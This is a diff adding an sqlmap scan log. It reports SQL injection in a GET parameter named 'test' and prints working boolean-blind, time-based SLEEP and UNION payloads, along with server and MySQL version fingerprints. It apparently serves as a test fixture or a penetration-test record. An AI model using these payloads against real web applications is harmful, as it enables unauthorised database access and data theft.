@@ -1,0 +1,20 @@
+sqlmap identified the following injection point(s) with a total of 332 HTTP(s) requests:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: test=query' AND 1848=(SELECT (CASE WHEN (1848=1848) THEN 1848 ELSE (SELECT 6569 UNION SELECT 2678) END))-- -
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT 8010 FROM (SELECT(SLEEP(5)))KMaH)-- kdvm
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x7162627071,0x4c627947475a4b63634f7856656248506b4264547748744c50754879546d72556652737265614375,0x716b767671),NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: active fingerprint: MySQL >= 8.0.0
+               comment injection fingerprint: MySQL 8.0.22
+               html error message fingerprint: MySQL
